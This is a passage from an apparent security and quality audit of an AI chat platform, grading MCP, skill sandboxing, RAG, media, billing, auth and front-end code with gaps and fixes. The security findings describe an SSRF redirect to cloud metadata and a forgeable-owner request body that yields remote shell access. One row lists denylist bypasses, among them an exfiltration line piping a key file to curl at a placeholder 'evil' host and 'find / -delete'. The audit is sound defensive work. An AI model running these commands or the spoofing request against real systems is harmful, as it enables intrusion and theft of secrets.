  - фикс: Wrap the MCP global-state mutations in a threading.Lock (or use a small per-server lock keyed by name). Optionally shorten TTL for empty/error results so a failed probe re-tries sooner.
- **Graceful error handling & session re-init** — `meets` [low]
  - разрыв: Output cap of 6000 chars (mcp_call_tool, 6901) silently truncates large tool results with no indication; image/blob content from tools is JSON-dumped rather than surfaced usefully (6897). The 30s per-RPC timeout (6829) is fixed and not configurable.
  - фикс: Append a '…(truncated)' marker when capping; handle content types image/audio/resource explicitly; make the timeout configurable per server.
  - **главные разрывы:** SSRF redirect guard exists (_SSRFGuardRedirectHandler/_ssrf_safe_opener, server.py:4627-4642) but is NOT used by the MCP transport — _mcp_rpc (6829) and _mcp_ensure (6860) call plain urllib.request.urlopen, so a public MCP URL that 302-redirects to 169.254.169.254 / 127.0.0.1 exfiltrates cloud metadata and internal services. Fix: switch both to _ssrf_safe_opener().open(...) and re-check _is_public_url per call. (high); OAuth flow is entirely missing despite the catalog advertising GitHub/Notion as auth:'oauth' — only manually-pasted bearer tokens work (comment admits 'Полный браузерный OAuth вне scope', server.py:6778). True OAuth-only servers are unusable. Needs WWW-Authenticate discovery + dynamic registration + PKCE authorize/callback + token refresh. (high); SSRF check is one-shot at add-time only (server.py:6751/12022), creating a DNS-rebind TOCTOU against the repeated RPC calls; validate per call and pin the resolved public IP. (med)

### Skill capability detection + sandboxed execution — оценка C-
- **Safe sandboxed execution — no host-origin RCE (owner gate)** — `wrong` [critical]
  - разрыв: Spoofable owner -> arbitrary host code execution. rlimits+timeout (server.py:5324-5333) cap CPU/RAM but do NOT contain RCE: real env (API keys/secrets in os.environ), real filesystem, real network — full host compromise within the process's reach.
  - фикс: Add resolve_caller(): derive uid ONLY from a verified bearer token (auth.uid_from_token) in api_skill_folder and every skills handler; drop the body `user` field. Make is_owner require an explicit verified owner flag and STOP treating the literal 'default' as owner in any internet-reachable deployme
- **Non-owner JS skill runs sandboxed (not in host origin)** — `wrong` [critical]
  - разрыв: Untrusted skill JS executes in the Taiga first-party origin with ambient authority. Direct DOM/credential/CSRF-token theft and same-origin API abuse. WebContainer is noted as 'отложено' (deferred), so there is no real JS sandbox at all.
  - фикс: Run JS in a Web Worker created from a Blob URL (no DOM), or a cross-origin sandboxed iframe (sandbox='allow-scripts', null origin), or QuickJS-WASM. Pass code+input in, postMessage stdout out, expose nothing else. Until then, do NOT auto-run user JS skills — show code for manual review only.
- **Non-owner Python runs sandboxed (Pyodide in browser)** — `partial` [high]
  - разрыв: (1) Pyodide JS/loader still runs on the main page thread (not a Worker), so a crafted package or pyodide_http can reach window/same-origin fetch via JS interop; CPU-heavy code freezes the user's tab (no Worker timeout/kill). (2) Loader trusts a remote CDN script (skill-caps.ts:141-151) with no Subre
  - фикс: Run Pyodide inside a dedicated Web Worker (isolates from DOM + enables hard timeout/terminate); add SRI hash (or self-host) the pyodide.js loader; keep network off (don't ship pyodide_http unless explicitly needed).
- **Run gating clarity: owner=server / user=browser-wasm / needs-server=E2B-or-bridge** — `meets` [med]
  - разрыв: The gating *decision tree* is sound, but it sits on top of the two broken trust boundaries above (spoofable owner; non-sandboxed JS), so 'safe gating' is undermined in practice. anti-traversal on script paths IS correctly enforced (skills_run.py:300-311, dest.resolve().relative_to in import skills_r
  - фикс: No change to the tree itself; fix the owner-token and JS-sandbox inputs feeding it. Add an explicit server-side cap that owner-native run is unreachable unless a verified-owner token is present.
- **Capability detection wired INTO import (analyze_skill called at import time, never executes the skill)** — `meets` [low]
  - разрыв: Effectively none for this sub-feature. Minor: caps are computed only at folder-import time; the single-SKILL.md fallback path (skills_run.py:108-119) and pre-analyzer skills get badge=''/caps={}, so older skills silently route by language fallback in _caps_needs_server (bash/js=>server, python=>brow
  - фикс: Backfill caps for legacy skills lazily on first run/list (call analyze_skill on the stored folder if badge is empty). Optionally re-analyze on toggle/list to self-heal.
- **Dependency handling (third-party split, Pyodide allowlist, micropip)** — `meets` [low]
  - разрыв: Allowlist must be hand-synced between skill_pyodide_packages.json, skill_caps.py and the TS mirror (skill-caps.ts:52-106) — drift risk. Package-name vs import-name mismatches (e.g. PyPI 'beautifulsoup4' vs import 'bs4', 'Pillow' vs 'PIL', 'opencv-python' vs 'cv2') can misclassify a runnable skill as
  - фикс: Generate the TS mirror from the JSON at build time (single source of truth); add an import-name<->dist-name alias map for the common Pyodide wheels; treat unknown third-party conservatively (already fail-closed to pyodide_no, which is correct).
- **Static compatibility badge (full/partial/instruction-only/needs-server/unsupported) accuracy** — `meets` [low]
  - разрыв: 'needs_network' is regex-detected including a bare `https?://` substring (skill_caps.py:298), so a skill that merely mentions a URL in a string/comment can be force-flagged needs-server (false positive -> unnecessarily blocks browser run / pushes to E2B). claude_authored detection is heuristic and c
  - фикс: Tighten _NET_RE so a bare URL literal alone doesn't set needs_network (require an actual client call: requests/httpx/fetch/urlopen/socket); keep URL-only as a weak signal that doesn't flip the badge.
  - **главные разрывы:** CRITICAL (host RCE): api_skill_folder trusts uid=c.get('user','default') from the request body and is_owner treats 'default' as owner, so an unauthenticated POST can hit the owner-native run_code_file path and execute arbitrary code on the server host with real env/secrets (server.py:10539,7009-7014,5367; REBUILD-BRIEF mine #0). The repo HAS auth.uid_from_token but the skills surface ignores it.; CRITICAL (client sandbox escape): non-owner JS skills run via new Function(...) on the main page thread (full-skills.ts:167-174), not in a Worker/iframe/WASM — full access to window, same-origin fetch with the user's session, and localStorage tokens (auth + native-bridge token). 'изолированный scope' is a misnomer; WebContainer isolation is deferred, so there is no JS sandbox at all.; HIGH: Pyodide python runs in-page (not a Worker) and its loader is fetched from jsDelivr CDN with no Subresource Integrity (skill-caps.ts:141-151,274-309) — no hard timeout/terminate for runaway code, and a CDN compromise injects arbitrary JS into the first-party origin.

### Memory, RAG & Grounding — оценка B-
- **Memory writes indexed for search (FTS on write)** — `wrong` [high]
  - разрыв: After first boot, all newly-remembered/updated/forgotten facts are absent from full-text search until a process restart with an empty index. 'Full-text search over remembered facts' is effectively stale/broken in steady state. Also memory is indexed as ONE concatenated blob per user (cid='__memory__
  - фикс: Call _fts_index_memory(conn, uid) from save_memory (under _FTS_LOCK/_DB_LOCK, fail-safe) so writes re-index incrementally; index each fact as its own FTS row; add memory scanning to _like_search fallback.
- **Grounding retrieval (source-of-truth mode)** — `partial` [high]
  - разрыв: The anti-hallucination flagship mode uses the weakest retrieval in the file: keyword overlap on coarse paragraph chunks. A user asking a paraphrased question can get 'не подтверждено источниками' even when the answer is in a source but lexically mismatched. Also bypasses the superior _rag_chunks spl
  - фикс: Embed source chunks at add-time and run the same dense+keyword+RRF hybrid (rag_query_smart) over them; reuse _rag_chunks for grounding chunking.
- **Embeddings pipeline** — `partial` [med]
  - разрыв: Ingesting an N-chunk doc fires N sequential network calls (slow, rate-limit-prone). If NanoGPT key missing/down, ingest hard-fails and retrieval silently degrades to keyword-only via the rrf fallback. Query embeddings are recomputed every turn (no cache).
  - фикс: Batch inputs into one /v1/embeddings call (the API accepts a list); add a local sentence-transformer/MLX fallback; cache query embeddings by hash.
- **Reranking of retrieved chunks** — `partial` [med]
  - разрыв: The headline 'premium smart-search (MultiQuery + LLM rerank)' is real code but dormant for the default user. Most users get fused top-k with no rerank. There is no cross-encoder, only a JSON-scoring LLM prompt (fragile to malformed output, though it fails safe).
  - фикс: Either default rerank on for small candidate sets, or wire a lightweight local cross-encoder; surface a clear 'smart search' toggle default-on for paid tiers.
- **Memory retrieval / relevance injection (memory_block)** — `partial` [med]
  - разрыв: Retrieval is pure lexical overlap — no embeddings. A fact phrased differently from the query (synonyms, other language) won't be selected even if highly relevant, despite the system already having an embedding pipeline. Falls back to 'most recent' when zero overlap, which can inject irrelevant facts
  - фикс: Embed facts (reuse _rag_embed) and add a cosine channel fused with the keyword overlap, mirroring the RAG hybrid approach; cache fact embeddings.
- **Freshness / recency weighting** — `missing` [med]
  - разрыв: Stale documents/facts rank identically to fresh ones; an updated doc and its old version compete on cosine alone. No staleness handling for time-sensitive context.
  - фикс: Persist ingest/update ts per chunk and add a recency multiplier (exp decay) to fused scores; in memory_block weight overlap*recency rather than overlap + tiny tie-break.
- **Document chunking (structure-aware)** — `meets` [low]
  - разрыв: Char-based target (900) not token-based, so chunks can over/undershoot model token budgets; no per-chunk metadata (heading path, position, timestamp) carried for later boosting.
  - фикс: Add token-aware sizing (tiktoken-style estimate) and store heading-breadcrumb + ingest ts per chunk for freshness/section boosting.
- **RAG retrieval — hybrid (dense + keyword + RRF)** — `meets` [low]
  - разрыв: RRF fuses dense+keyword but the dense channel is a single query (variants=1 in default), so MultiQuery expansion is NOT used unless smart=true. Keyword channel is naive substring fraction, not BM25.
  - фикс: Default-enable 2 query variants (cheap heuristic, no LLM) and replace substring keyword score with a small BM25 over the in-scope chunks.
- **Citations in injected context** — `meets` [low]
  - разрыв: RAG-mode [doc] labels are not numbered/clickable like grounding's [N]; the model is merely asked to cite, with no post-hoc check that emitted [doc]/[N] tags actually correspond to injected sources.
  - фикс: Normalize RAG to numbered citations too and add a cheap post-response validator that flags citations not present in the injected set.
- **Deduplication of retrieved chunks** — `meets` [low]
  - разрыв: Dedup key is exact normalized text; near-duplicate chunks with overlap (from the 150-char overlap) can both survive since their text differs slightly.
  - фикс: Add a similarity-based dedup (Jaccard/cosine) at fusion time, mirroring what consolidate_memory already does for facts.
- **Memory consolidation (sleep-time)** — `meets` [low]
  - разрыв: Engine is solid but env-gated OFF by default (sleep-time disabled per inventory); relies on Jaccard word-overlap, so semantically-equivalent but lexically-different facts ('lives in Berlin' / 'moved to Germany') are NOT merged here (that only happens on-write via reconcile_memory).
  - фикс: Enable a conservative nightly pass by default for idle users; optionally add an embedding-similarity near-dup tier for paraphrase merges.
- **Semantic compression of retrieved context** — `meets` [low]
  - разрыв: Compression is per-chunk and lossy via an LLM that can drop facts; cache is in-process only (lost on restart); MLX endpoint hard-coded to localhost so it's a no-op fallback in any non-Mac deploy.
  - фикс: Persist compression cache; gate compression behind a relevance/length threshold; make the compressor endpoint configurable.
- **Hallucination / degradation post-verification** — `meets` [low]
  - разрыв: Verifier is opt-in (/api/verify) not inline by default; it judges hallucination from the model's own family (cheap aux model) without re-grounding against the retrieved sources beyond the passed context string.
  - фикс: Run verify inline for grounded mode and feed it the exact injected sources to check each [N] claim.
  - **главные разрывы:** Memory is NOT incrementally FTS-indexed on write: save_memory never calls _fts_index_memory; only a one-time boot backfill indexes it, so full-text memory search goes stale immediately and the LIKE fallback ignores memory entirely (server.py:7744 vs 7444/7472). High severity.; Grounding (the anti-hallucination flagship) and memory_block retrieve by keyword/token-overlap ONLY — no embeddings — despite a working embedding pipeline; paraphrased queries miss relevant sources/facts (server.py:2020, 8901).; LLM reranking exists (_rag_llm_rerank) but is dormant by default — only fires when the frontend sets smart=true; default chat RAG returns fused top-k with no rerank (server.py:1603, 13307).

### Studio / Media generation engines — оценка B-
- **base64-in-JSON memory safety** — `wrong` [critical]
  - разрыв: Unbounded body reads + whole-file base64 responses = direct OOM/DoS vector on the cinema/video/audio endpoints; the very thing the brief flagged.
  - фикс: Add a global Content-Length cap in _body() (reject >N MB). Write media outputs to ~/.mostik-ai/u/<uid>/media/ and return a served URL instead of data-URLs (esp. cinema-export — stream the MP4 file, don't base64 it). For uploads, accept multipart/streamed input rather than base64-in-JSON.
- **Reserve-then-refund on failure/timeout (video & music)** — `meets` [high]
  - разрыв: The refund only fires if the worker thread reaches finally. If the process is killed/restarted/OOM mid-poll (likely given the base64 memory issue below), the reservation is silently lost — no durable job store reconciles it. Also charge happens before the STARTED SSE; if that first write fails it do
  - фикс: Persist reservations to a jobs table keyed by provider request id; a startup/cron reconciler re-polls or refunds orphaned reserved jobs. Wrap reserve+poll so any exception before/after finally still reconciles.
- **Persistent job registry / job get-by-id** — `missing` [high]
  - разрыв: Zero durability and zero re-attach. A reload during a 6-min film/music job = lost result + dangling reservation.
  - фикс: Add media_jobs(id, uid, kind, provider, request_id, status, reserved, created) in SQLite; api_video/music writes a row at submit, updates on terminal states; add GET /api/media-job?id= to re-attach/poll; reconciler sweeps stale rows.
- **Retries on transient provider failures (image / TTS / 3D / submit)** — `partial` [med]
  - разрыв: A single transient 502/timeout from Venice/NanoGPT/AIMLAPI at submit fails the whole generation with no auto-retry, despite these being the flakiest calls.
  - фикс: Wrap submit + synchronous image/TTS/3D in a 2-3 attempt retry with short backoff on 5xx/timeout/IncompleteRead; keep the existing immediate-fail on 4xx (abuse/validation).
- **Abuse/SSRF/rate-limit gating on media endpoints** — `meets` [med]
  - разрыв: cinema-export is CPU/bandwidth heavy (ffmpeg + downloads) but is only rate-limited, not reserved/billed per second of compute — a funded user can burn server CPU cheaply.
  - фикс: Charge a small per-scene/per-second compute fee for cinema-export, or cap concurrent ffmpeg jobs with a semaphore.
- **Job lifecycle: submit → poll → progress (video)** — `meets` [low]
  - разрыв: No mid-job 'percent' progress (only elapsed seconds + coarse status), so the UI can only show a spinner+timer. Minor.
  - фикс: If the provider returns a progress/percent field, surface it in the video_status event; otherwise estimate from elapsed vs typical model duration.
- **Failure → refund for SYNCHRONOUS media (image, TTS, 3D, image-tool)** — `meets` [low]
  - разрыв: None functionally; only inconsistency is image_gen_price is computed twice (10140 and 10198) which is fine but slightly wasteful.
  - фикс: No change needed; optionally dedupe the price recompute.
- **Format handling (image dims, video i2v/avatar/r2v inputs, audio/music params, cinema scene mixing)** — `meets` [low]
  - разрыв: Cinema concat with -c copy after per-clip re-encode is fine, but mixed sources occasionally need the re-encode fallback (already handled). NanoGPT video output URL extraction (9917-9919) probes several shapes which is brittle if the provider changes schema.
  - фикс: Add a small unit/smoke test pinning the provider response shapes; otherwise acceptable.
- **Sane model selection / pricing / NanoGPT-funded gating** — `meets` [low]
  - разрыв: Default video model fallback string is 'wan-video-22-turbo' (9808) which may not exist in every catalog snapshot; price estimation is heuristic (acceptable since real cost is metered on the provider side via usd_spent).
  - фикс: Validate req.model against VIDEO_MODELS ids and fall back to the top featured funded model if unknown, instead of a hardcoded string.
- **Free vs paid TTS, free-image subscription path** — `meets` [low]
  - разрыв: free_tts concatenates raw MP3 byte streams (9546-9558) — naive concat of separate MP3 responses can yield players that stop after the first frame on some decoders; works in browsers but is not a real container merge.
  - фикс: Concatenate via a proper MP3/ffmpeg join (or return an array of clip URLs) if playback issues arise; low priority.
  - **главные разрывы:** CRITICAL memory: _body() reads request bodies with no size cap, and every media output (image, full WAV/MP3, and especially the entire concatenated MP4 in api_cinema_export) is returned as base64-in-JSON held 2-3x in RAM — a direct OOM/DoS on the cinema/video/audio endpoints. The RAG path caps base64 before decode but the studio handlers do not.; No persistent job registry: long video/music jobs live only in the SSE handler thread. A dropped connection or server restart orphans the job — provider keeps billing the platform wallet and the user's reservation is never settled (refund only runs in the in-process finally).; Reserve-then-refund is correct only while the process stays alive; a crash/OOM/deploy mid-poll leaks the reservation with no reconciler to refund it.

### Billing / Balance / Pricing — оценка F
- **Real payment processor (take money in)** — `missing` [critical]
  - разрыв: Zero real money can enter the system. Every paying customer hits a 503. The entire monetization layer is decorative.
  - фикс: Implement a PaymentProvider (create_invoice -> redirect URL; store invoice_id+expected_amount+uid). Credit balance ONLY from a verified webhook, never from the client.
- **Payment webhook + signature verification** — `missing` [critical]
  - разрыв: No callback endpoint and no cryptographic verification. Even if a processor were added, there is nothing to receive or authenticate a settlement event, so credits would have to come from the unauthenticated client body.
  - фикс: Add a webhook handler that reads the raw body, verifies the processor signature with hmac.compare_digest, validates amount+currency+invoice status==paid, then credits inside an idempotent guard.
- **Idempotent charge / top-up / refund** — `missing` [critical]
  - разрыв: A retried payment webhook double-credits; a network retry on a video/chat request double-charges; a double-tapped top-up double-credits. No exactly-once semantics on any money operation.
  - фикс: Add an idempotency table keyed by (op_type, external_id). Wrap topup/meter/charge_media/refund_media so a duplicate key is a no-op returning the prior result.
- **test_topup global free-money flag** — `wrong` [critical]
  - разрыв: A single owner toggle turns the whole product into a free-money faucet for all users. This is exactly the 'global free-money flag' anti-pattern. It is also the closest thing to a checkout, and it bypasses payment entirely.
  - фикс: Delete test_topup as a global gate. If a test path is needed, restrict crediting to is_owner(uid) crediting only self, and label the ledger entry test so it is excluded from real revenue.
- **Owner free tier (untaxed)** — `partial` [high]
  - разрыв: Owner-exemption is duplicated across dozens of sites; any new paid endpoint that forgets the flag silently charges the owner or fails to charge a user. is_owner also derives from a uid that several paths take from the request body (c.get('user','default')), so the exemption can be spoofed where the 
  - фикс: Centralize owner-exemption inside meter/charge_media using a token-resolved caller (resolve_caller). Remove per-site `not owner` flags.
- **Accurate per-call token metering** — `partial` [high]
  - разрыв: Fail-open pricing: an off-catalog or zero-priced model is served for free with no warning. The len//4 token estimate under/over-bills whenever the provider omits a usage block. No reconciliation against provider-reported cost.
  - фикс: Make price_of fail closed: if price is (0,0)/unknown, refuse the call or apply a conservative max-price floor and log it. Prefer provider-returned usage/cost over est_tokens.
- **Pre-charge balance gating (no negative balance / race)** — `partial` [high]
  - разрыв: A user at $0.001 can run an arbitrarily expensive call and go negative (gate only blocks at <=0, not <need, except the video path 9875). Concurrent requests from the same user both pass the <=0 gate and both debit. No per-call cost reservation before doing the work.
  - фикс: Reserve the estimated max cost atomically before the call (single lock spanning estimate->reserve), reconcile to actual on completion, refund the difference. Block when balance < estimated need everywhere, not just <=0.
- **Audit trail / ledger** — `partial` [high]
  - разрыв: Not immutable and not complete — older entries are silently dropped at 200, so history beyond that is unauditable. Balance can diverge from ledger with no reconciliation. Refunds rewrite lifetime `spent`. No record of who/what/external txn id for credits.
  - фикс: Persist an append-only ledger table (uid, ts, type, amount_signed, model/kind, external_id, balance_after). Derive/verify balance from it; never truncate; never mutate past rows.
- **enabled global billing flag** — `wrong` [high]
  - разрыв: A single owner toggle (or a corrupted/empty billing blob) makes the entire platform free for all users at once. It is a global kill-switch on revenue with no per-tier or per-user granularity.
  - фикс: Remove the global free bypass; if a maintenance mode is needed, gate it per-account and log it, and keep metering recording even when collection is paused.
- **Reserve-then-refund for long media jobs** — `meets` [med]
  - разрыв: Refund path itself is not idempotent (a double-fire would over-refund) and mutates `spent` downward (8353), corrupting lifetime-spent. Reservation uses markup at submit time; if markup changes mid-job the refund can mismatch.
  - фикс: Key reserve/refund by run_id so each settles once; track reservations separately from `spent` so refunds don't decrement lifetime spend.
- **5-tier subscription (mini/basic/premium/pro/business)** — `missing` [low]
  - разрыв: No subscription product exists to audit here. Monetization is purely prepaid pay-as-you-go, and even that can't take money (see processor/webhook).
  - фикс: If subscriptions are intended, build a plans table + recurring-billing via the (still-missing) payment provider; otherwise this is correctly out of scope and only the prepaid wallet must be made functional.
  - **главные разрывы:** No payment processor and no payment webhook exist anywhere (grep yookassa/cloudpayments/btcpay/nowpayments/stripe/hmac/webhook-secret = 0). api_topup (server.py:12313) returns 503 to all real users — the product literally cannot accept a single payment.; No idempotency on any money operation: topup (12339), meter (8318), charge_media (8336), refund_media (8350) all apply unconditionally — a retried webhook/double-submit double-credits and a retried request double-charges.; test_topup (12334) is a global free-money faucet: one owner toggle lets ANY uid mint spendable balance from RUB with no payment; combined with the spoofable c.get('user') uid it is an open mint.

### Storage / Persistence + Accounts, Auth & Security — оценка D-
- **Caller identity / resolve_caller from a VERIFIED token (not body 'user')** — `missing` [critical]
  - разрыв: Any unauthenticated client picks who they are by sending {"user":"..."}. Sending {"user":"default"} = the owner account. No verification anywhere on the hot paths.
  - фикс: Add resolve_caller(self) that reads a token from Authorization header (or cookie), runs auth.uid_from_token, and returns that uid; fall back to 'default' ONLY when binding to 127.0.0.1 in single-user dev mode. Replace all `c.get("user", "default")` with `self.caller`. Reject body 'user' that disagre
- **is_owner / owner gating (forgeable owner = critical)** — `wrong` [critical]
  - разрыв: POST {"user":"default"} to any owner route grants full owner powers: billing console (credit any user / set markup / set rates), catalog rebuild, see-hidden-models, run admin ops — all by an anonymous caller.
  - фикс: Make is_owner only callable on a verified uid (enforced by resolve_caller). Add an explicit @owner_only guard that 403s unless self.caller maps to a verified owner. Remove the 'default'==owner shortcut for any network-exposed bind.
- **Owner-only dev tools (shell / run_code / read_file / write_file / edit_file) gating** — `wrong` [critical]
  - разрыв: Live remote code execution: an anonymous request `{"user":"default","dev":true,"agent":true,"messages":[...]}` exposes tool_shell to the model = arbitrary shell as the server user. This is mine #0 from CLAUDE.md, still live.
  - фикс: Gate dev on resolve_caller-verified owner. Additionally bind the server to localhost only until token auth is enforced, and never trust 'default'==owner over the network.
- **tool_read_file scoping (least-privilege file access)** — `wrong` [high]
  - разрыв: Reads ANY file the process can: /etc/passwd (only the literal '/etc/passwd' string is denylisted for shell, not for read_file), ~/.mostik-ai/.auth_secret (token-signing key!), ~/.cookie_key (the single Fernet key — decrypts everyone's secrets), SSH keys, env files. Combined with forgeable owner, ful
  - фикс: Resolve to realpath and require it to be within an explicit allowlist of roots; reject symlinks escaping the jail; hard-deny the key files (.auth_secret, .cookie_key) and dotfiles. Same jail for list_dir/write_file/edit_file.
- **tool_shell scoping (least-privilege shell)** — `partial` [high]
  - разрыв: Regex denylist is trivially bypassable (e.g. `python -c 'os.system(...)'`, base64-encoded payloads, `find / -delete`, exfil via `cat ~/.cookie_key | curl -d @- evil`). No resource limits on the shell path -> fork bomb / disk fill possible. Only meaningful because of the forgeable-owner gate above.
  - фикс: Route tool_shell through a real sandbox (E2B/container) or at minimum _rlimit_preexec + temp cwd + dropped env, and switch from denylist to an allowlist of permitted binaries. Treat the denylist as defense-in-depth only.
- **Per-user secret keying + rotation (BYOK / cookies / MCP tokens / userfiles encryption)** — `partial` [high]
  - разрыв: Single key protects every user's provider keys, login cookies, MCP tokens, and files. One leak (or one tool_read_file of .cookie_key) decrypts everyone. No rotation means a leaked key can never be retired without rewriting all blobs.
  - фикс: Derive per-user keys via HKDF(master_key, uid) or bind uid as Fernet AAD-equivalent (use a versioned envelope, e.g. enc:v2:<keyid>:<ct>); store master in OS keychain/KMS not a plaintext sibling file; add a rotate() that re-wraps. At minimum lock down .cookie_key permissions and exclude it from any f
- **Encryption at rest for chat history + long-term memory** — `missing` [high]
  - разрыв: Anyone with read access to ~/.mostik-ai/db/taiga.db (backup, stolen disk, the unscoped tool_read_file, another tenant) gets every user's complete uncensored chat logs and personal profile in the clear.
  - фикс: Encrypt the high-sensitivity columns (chats.data, memory.data, notes.data) with the per-user envelope from the fix above, or encrypt the whole DB (SQLCipher). Keep FTS on a separate, access-controlled path or index ciphertext-blind tokens.
- **DB layer: transactions + indices + no races** — `partial` [med]
  - разрыв: Lost-update race: topup racing a concurrent charge can drop the charge or the credit (real money). Settings/memory/notes last-writer-wins clobber. _balance_lock is in-process only — a second worker process would race the DB entirely (no SELECT...FOR UPDATE / no atomic UPDATE...SET balance=balance-?)
  - фикс: Wrap ALL balance mutations (incl. both topups) in _balance_lock, and convert to a single atomic SQL UPDATE (e.g. UPDATE balance SET data=json_set(...)) inside one transaction, or move balance to numeric columns with `UPDATE ... SET balance = balance - ? WHERE balance >= ?` for correct concurrent sem
- **Mostik-API-key resale path (token-based identity, the ONE place identity is real)** — `partial` [med]
  - разрыв: Inconsistent: the /v1 resale proxy authenticates by key, but the main /api/* surface ignores tokens entirely. No scoping/rate-limit per key beyond balance.
  - фикс: Generalize this key->identity resolution into resolve_caller so the whole app authenticates the same way; add per-key scopes + rate limits.
- **Input validation (custom functions / userConfig / sizes / ids)** — `meets` [low]
  - разрыв: Validation quality is good; its value is undercut because identity (the thing all these checks protect) is forgeable. safe_id silently collapses distinct ids to the same value (edge collision), minor.
  - фикс: Keep as-is; once resolve_caller lands, this layer becomes genuinely effective. Consider rejecting (not silently stripping) malformed ids to avoid collision aliasing.
  - **главные разрывы:** CRITICAL forgeable owner (mine #0, still live): identity comes from the request body 'user' field (~75 sites, e.g. server.py:13226, 12350) and is never verified against a token; {"user":"default"} = owner. auth.py has a correct HMAC token system that is wired into nothing.; CRITICAL remote code execution: /api/chat with {"user":"default","dev":true,...} passes is_owner() and exposes tool_shell (raw host `subprocess shell=True`, server.py:5315) + unscoped tool_read_file (5307) to the model — anonymous RCE and arbitrary file read (incl. the .auth_secret and .cookie_key key files).; Single shared Fernet key (.cookie_key, server.py:7614) encrypts EVERY user's cookies, BYOK provider keys, MCP tokens and files — no per-user keying, no rotation; one key leak (or one tool_read_file) decrypts all users. Falsely commented 'per-user'.

### Тайга frontend — chat.tsx + use-taiga-chat.ts + src/ React architecture quality — оценка D
- **Component decomposition (no 7800-line monster)** — `wrong` [critical]
  - разрыв: Effectively impossible to navigate, review, or modify safely. Any change forces re-reasoning about 165 state vars in one scope. No code-splitting: all 40 heavy panels (image-studio, cinema, design-system, agent-os) are statically imported into one bundle even when unused. The project's own CLAUDE.md
  - фикс: Extract MessageList + memoized MessageRow first (biggest win, see perf). Then split the orchestration into hooks (useChatPersistence, useChatModes, useVoice, useAttachments) and pull each panel behind React.lazy/dynamic import so they code-split. Target: chat.tsx shell <500 lines.
- **State management (no 165 useState + prop-drilling + stale closures)** — `wrong` [critical]
  - разрыв: This is the textbook anti-pattern the brief names. 165 co-located useState means every keystroke/toggle can re-render the entire 7.8k-line tree; 37 ref-mirrors are a smell that state lives at the wrong altitude. Prop-drilling makes panels non-reusable and refactors fragile.
  - фикс: Move durable/cross-cutting state into a Zustand store (or 3-4 Context+useReducer slices: settingsStore, modesStore, panelsStore, billingStore). Panels subscribe to the store directly, deleting most props and all 37 ref mirrors. Keep only truly-local UI state (input text, open/closed) as useState.
- **Error boundaries** — `partial` [high]
  - разрыв: The primitive exists and is good — coverage is the failure. A render error in MessageRow (e.g. bad markdown/artifact/chart payload from a model) or in any unwrapped panel crashes the whole single-component app, since everything lives under one Chat() with no boundary above it.
  - фикс: Wrap the app root, the <MessageList> (once extracted), and each lazy panel in <ErrorBoundary label=...>. Add the sentry hook the comment already anticipates. Zero new infra needed — just apply the existing component.
- **Performance (re-render isolation, virtualization, memoization)** — `wrong` [high]
  - разрыв: On a long conversation this is O(all messages) work per streamed token frame plus full-tree reconciliation — visible jank exactly when streaming. The coalescer in the hook mitigates setState frequency but cannot fix that each render re-maps the whole list inside the mega-component.
  - фикс: Extract MessageRow as React.memo(key=id) and wrap the list in react-virtuoso; lift inline row logic out of the IIFE; lazy-import panels. After decomposition, streaming should re-render only the last row.
- **Testing (component + integration coverage)** — `stub` [high]
  - разрыв: The two most complex/fragile units (the 7.8k component and the streaming hook) have no automated safety net — which is also why the strangler-fig decomposition is risky to perform.
  - фикс: Before/while decomposing, add testing-library coverage for the hook's SSE/failover/coalescer paths and for each extracted component (MessageRow, Composer). Use the existing tests as the pattern.
- **Accessibility** — `partial` [med]
  - разрыв: Screen-reader users can't identify most actions; streaming text isn't announced; keyboard-only users can tab out of open modals. Partial, not absent.
  - фикс: Add aria-label to every icon button (MsgAction already takes label — forward it to aria-label), wrap the answer container in role=log/aria-live=polite, and standardize a Dialog primitive (focus-trap + aria-modal) reused by all panels.
- **Persistence / side-effect management** — `partial` [med]
  - разрыв: Heavy copy-paste boilerplate (the brief calls this out); easy to desync a key; SSR guard duplicated ~50x; persistence concerns smeared through the mega-component instead of isolated.
  - фикс: Introduce one usePersistentState(key, default) hook (SSR-safe, JSON-typed) and/or a settings store with localStorage middleware. Collapses ~100 lines of duplicated effects into declarations and removes the per-field guards.
- **Branch/edit tree vs linear render consistency** — `partial` [med]
  - разрыв: Two parallel models (hook's linear messages + the tree) kept in sync by effects rather than one deriving from the other — a coherence hazard during edits/forks, and another reason state should be consolidated.
  - фикс: Make activePath(tree) the single render source, with the hook's messages derived from it, so branch state can't diverge from what's shown.
- **Data fetching layer** — `partial` [med]
  - разрыв: Inconsistent: one good cache for catalog, raw scattered fetches everywhere else; no unified loading/error/retry semantics; some effects refetch on broad deps ([busy, messages, followupsOn] re-runs the followups effect on every message mutation).
  - фикс: Adopt a thin query layer (SWR or a tiny useFetch) for the read endpoints; keep streaming on the bespoke hook. Narrow the followups effect deps to the last assistant message id, not the whole messages array.
- **Streaming chat state machine (the use-taiga-chat hook)** — `meets` [low]
  - разрыв: Minor: SseEvent is `any`; send()/sendPipeline() are ~290/200-line callbacks that duplicate SSE-parse + fetch-retry logic (sendPipeline reimplements the reader loop instead of sharing attempt()); patchLast mutates only the LAST message, so out-of-order events on non-final messages aren't handled. Non
  - фикс: Extract a shared readSse(reader, onEvent) + attempt() used by both send and sendPipeline; type SseEvent as a discriminated union. Otherwise leave as-is — this is the part to KEEP during decomposition.
  - **главные разрывы:** chat.tsx is a single 7803-line component (Chat() ~7350 lines) — the 'monster' is real and undecomposed; ~40 heavy panels are statically imported with no code-splitting.; 165 useState + 25 useRef + 28 useEffect in ONE scope, zero Context/store, app-wide prop-drilling into ~40 panels, and 37 manual 'xRef.current = x' mirrors to dodge stale closures — exactly the state-management anti-pattern called out.; ErrorBoundary is well-built but covers only 2 of ~40 panels; the main chat tree, message list and app root can white-screen on a single bad render.

### Routines, Scheduler & Automations — оценка C+
- **Event routines (on_run_done / on_chat_match) — dead event path / no producer** — `stub` [high]
  - разрыв: 100% of event routines are non-functional. A user can create, save, enable an on_run_done/on_chat_match routine in the UI, see it listed as enabled, and it will NEVER run — an orphan user-facing promise. FEATURE-INVENTORY.md line 204 itself admits 'backend handler exists but NEVER fires — no produce
  - фикс: Call _routine_fire_event(uid, 'run_done', summary) internally right after every agent/orchestration run completes (next to emit('done',...) at server.py:10831/10879/11301), and _routine_fire_event(uid, 'chat_match', text) inside the chat send path on each user/assistant message. Wrap in try/except +
- **No orphan user-facing promises** — `wrong` [high]
  - разрыв: Direct orphan promise: the product UI advertises and persists event-automations that are silently inert. This is the single most user-visible quality gap in the area.
  - фикс: Either wire the producers (see first row) or gate/disable the two event-trigger options in the UI with a 'скоро' badge until producers land. Do not ship enable-able triggers with no firing path.
